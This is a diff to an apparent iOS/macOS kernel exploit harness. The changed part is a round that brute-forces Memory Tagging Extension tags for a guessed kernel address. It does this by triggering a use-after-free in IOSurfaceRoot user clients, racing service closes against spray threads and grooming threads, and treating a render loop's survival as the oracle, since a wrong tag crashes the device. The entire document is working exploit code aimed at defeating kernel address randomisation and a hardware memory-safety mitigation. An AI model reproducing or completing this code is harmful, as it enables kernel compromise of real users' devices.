@@ -24816,15 +24816,25 @@ new_modes:
                 rlog("=== r=204 complete ===\n");
             }
 
-            /* r=205: MTE tag probe — test one candidate with all 16 tags */
+            /* r=205: MTE tag probe — test one candidate with all 16 tags
+             * Uses the actual UAF + render loop oracle (same as r=204).
+             * Each tag that survives the render loop = valid MTE allocation tag.
+             * Wrong tags crash the device (MTE fault). */
             if (rounds == 205) {
                 rlog("\n=== r=205: MTE tag probe ===\n");
-                int r205_ci = 130; /* mid-range candidate */
+                int r205_ci = 130;
                 if (argc > 3) r205_ci = atoi(argv[3]);
+                int r205_tag = 0;
+                int r205_tag_end = 16;
+                if (argc > 4) { r205_tag = atoi(argv[4]); r205_tag_end = r205_tag + 1; }
 
-                rlog("  Candidate index: %d\n", r205_ci);
                 uint64_t r205_cand = R203_SLIDE_MIN + (uint64_t)r205_ci * R203_SLIDE_STEP;
                 uint64_t r205_base = R198_KC_BASE + r205_cand + BSS_MID_DEFAULT;
+                rlog("  Candidate index: %d  slide=0x%llx\n", r205_ci,
+                     (unsigned long long)r205_cand);
+                rlog("  Base addr (no tag): 0x%016llx\n",
+                     (unsigned long long)r205_base);
+                rlog("  Tag range: 0x%X to 0x%X\n", r205_tag, r205_tag_end - 1);
 
                 io_service_t r205_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                     IOServiceMatching("IOSurfaceRoot"));
@@ -24851,7 +24861,7 @@ new_modes:
                 p16_groom_wps = r205_gwps;
                 p16_groom_n = r205_gn;
 
-                for (int tag = 0; tag < 16; tag++) {
+                for (int tag = r205_tag; tag < r205_tag_end; tag++) {
                     uint64_t r205_probe = (r205_base & 0x00FFFFFFFFFFFFFFULL) |
                                           ((uint64_t)tag << 56);
                     rlog("  TAG_PROBE tag=0x%X probe=0x%016llx\n", tag,
@@ -24877,96 +24887,43 @@ new_modes:
                             mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
                             mach_port_insert_right(mach_task_self(), tw, tw,
                                 MACH_MSG_TYPE_MAKE_SEND);
-                            uint64_t si17[3]; uint32_t si17c = 3;
-                            IOConnectCallScalarMethod(r205_pcs[i], 17,
-                                r205_inp, 3, si17, &si17c);
-                            IOConnectCallScalarMethod(r205_pcs[i], 18,
-                                r205_inp, 3, si17, &si17c);
+                            uint64_t ref = 0xD7;
+                            IOConnectCallAsyncMethod(r205_pcs[i], 17, tw, &ref, 1,
+                                NULL, 0, r205_inp, 24, NULL, NULL, NULL, NULL);
                             mach_port_deallocate(mach_task_self(), tw);
-                        }
+                        } else r205_pcs[i] = IO_OBJECT_NULL;
                     }
 
+                    p13_spam_run = 1;
+                    p13_spam_conn = r205_phave[0] ? r205_pcs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 1;
+                    p13_spam_count = 0;
+                    pthread_t r205_spam[16];
+                    for (int t = 0; t < 16; t++)
+                        pthread_create(&r205_spam[t], NULL, p13_spam_reg, NULL);
+
+                    for (int i = 7; i >= 0; i--) {
+                        if (r205_phave[i]) { IOServiceClose(r205_pcs[i]); r205_phave[i] = 0; }
+                        usleep(100);
+                    }
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 16; t++) pthread_join(r205_spam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (r205_phave[i]) IOServiceClose(r205_pcs[i]);
+                    usleep(2000);
                     p16_groom_run = 0;
-                    for (int t = 0; t < 4; t++)
-                        pthread_join(r205_gths[t], NULL);
-                    rlog("    groom=%d\n", p16_groom_count);
+                    for (int t = 0; t < 4; t++) pthread_join(r205_gths[t], NULL);
 
-                    CFMutableDictionaryRef r205_pd =
-                        CFDictionaryCreateMutable(NULL, 0,
-                            &kCFTypeDictionaryKeyCallBacks,
-                            &kCFTypeDictionaryValueCallBacks);
-                    int32_t r205_w = 64, r205_h = 64;
-                    CFNumberRef r205_wn = CFNumberCreate(NULL, kCFNumberSInt32Type, &r205_w);
-                    CFNumberRef r205_hn = CFNumberCreate(NULL, kCFNumberSInt32Type, &r205_h);
-                    CFDictionarySetValue(r205_pd, CFSTR("Width"), r205_wn);
-                    CFDictionarySetValue(r205_pd, CFSTR("Height"), r205_hn);
-                    int32_t r205_pf = 0x42475241;
-                    CFNumberRef r205_pfn = CFNumberCreate(NULL, kCFNumberSInt32Type, &r205_pf);
-                    CFDictionarySetValue(r205_pd, CFSTR("PixelFormat"), r205_pfn);
+                    rlog("    groom=%llu ", (unsigned long long)p16_groom_count);
 
-                    CVPixelBufferRef r205_pb = NULL;
-                    CVPixelBufferCreate(NULL, r205_w, r205_h, r205_pf, r205_pd, &r205_pb);
+                    p13_render_run = 1;
+                    p13_render_frames = 0;
+                    pthread_t r205_pr;
+                    pthread_create(&r205_pr, NULL, p13_render_loop, NULL);
+                    usleep(200000);
+                    p13_render_run = 0;
+                    pthread_join(r205_pr, NULL);
 
-                    int r205_survived = 0;
-                    if (r205_pb) {
-                        VTDecompressionSessionRef ds = NULL;
-                        CMVideoFormatDescriptionRef vfd = NULL;
-                        CMVideoFormatDescriptionCreateFromH264ParameterSets(NULL,
-                            (const uint8_t *const []){
-                                (const uint8_t[]){0x67,0x42,0xc0,0x0a,0xd9,0x07,0x3c,0x04,0x40},
-                                (const uint8_t[]){0x68,0xce,0x38,0x80}
-                            },
-                            (const size_t[]){9, 4}, 2, 4, &vfd);
-                        if (vfd) {
-                            VTDecompressionOutputCallbackRecord cb = {
-                                .decompressionOutputCallback = NULL,
-                                .decompressionOutputRefCon = NULL
-                            };
-                            VTDecompressionSessionCreate(NULL, vfd, NULL, NULL, &cb, &ds);
-                        }
-                        if (ds) {
-                            const uint8_t nalu[] = {
-                                0x00,0x00,0x00,0x10,
-                                0x65,0x88,0x80,0x40,0x00,0x6b,0x6f,0xfe,
-                                0x5d,0xeb,0x52,0xeb,0x52,0xeb,0x52,0x00
-                            };
-                            CMBlockBufferRef bb = NULL;
-                            CMBlockBufferCreateWithMemoryBlock(NULL,
-                                (void *)nalu, sizeof(nalu), kCFAllocatorNull,
-                                NULL, 0, sizeof(nalu), 0, &bb);
-                            CMSampleBufferRef sb = NULL;
-                            CMSampleTimingInfo ti = {
-                                .duration = CMTimeMake(1, 30),
-                                .presentationTimeStamp = CMTimeMake(0, 30),
-                                .decodeTimeStamp = kCMTimeInvalid
-                            };
-                            const size_t ss = sizeof(nalu);
-                            CMSampleBufferCreateReady(NULL, bb, vfd, 1, 1, &ti, 1, &ss, &sb);
-                            if (sb) {
-                                VTDecodeFrameFlags ff = kVTDecodeFrame_1xRealTimePlayback;
-                                VTDecodeInfoFlags fi;
-                                VTDecompressionSessionDecodeFrame(ds, sb, ff, NULL, &fi);
-                                VTDecompressionSessionWaitForAsynchronousFrames(ds);
-                                r205_survived = 1;
-                                rlog("    tag=0x%X SURVIVED\n", tag);
-                                CFRelease(sb);
-                            }
-                            if (bb) CFRelease(bb);
-                            VTDecompressionSessionInvalidate(ds);
-                            CFRelease(ds);
-                        }
-                        if (vfd) CFRelease(vfd);
-                        CFRelease(r205_pb);
-                    }
-                    CFRelease(r205_pd); CFRelease(r205_wn);
-                    CFRelease(r205_hn); CFRelease(r205_pfn);
-
-                    for (int i = 0; i < 8; i++)
-                        if (r205_phave[i]) IOServiceClose(r205_pcs[i]);
-
-                    if (!r205_survived)
-                        rlog("    tag=0x%X CRASHED (should not see this)\n", tag);
-
+                    rlog("frames=%d tag=0x%X SURVIVED\n", p13_render_frames, tag);
                     usleep(100000);
                 }
 
